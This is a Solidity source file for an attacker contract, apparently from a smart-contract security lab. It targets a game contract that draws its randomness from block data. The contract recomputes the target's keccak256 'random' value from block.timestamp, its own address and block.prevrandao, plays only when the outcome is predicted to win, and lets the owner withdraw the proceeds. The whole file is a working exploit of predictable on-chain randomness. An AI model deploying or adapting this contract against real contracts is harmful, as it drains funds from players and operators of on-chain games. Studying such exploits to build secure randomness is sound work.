// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

interface IInsecureRandom {
    function play() external payable returns (string memory);
}

contract InsecureRandomAttacker {
    IInsecureRandom public target;
    address public owner;

    event Predicted(uint256 predicted, uint256 blockNumber, uint256 timestamp);

    constructor(address _target) {
        target = IInsecureRandom(_target);
        owner = msg.sender;
    }

    // Usa el balance del contrato atacante para pagar play
    function attack() external {
        uint256 contractBalance = address(this).balance;
        require(contractBalance >= 0.01 ether, "Attacker contract needs at least 0.01 ETH");

        // Predicción usando inputs on-chain (misma fórmula)
        uint256 predicted = uint256(
            keccak256(abi.encodePacked(block.timestamp, address(this), block.prevrandao))
        ) % 100;

        emit Predicted(predicted, block.number, block.timestamp);

        // Llamamos a play solo si predicho favorable (par)
        if (predicted % 2 == 0) {
            target.play{value: 0.01 ether}();
        }
    }

    function withdraw() external {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {}
}
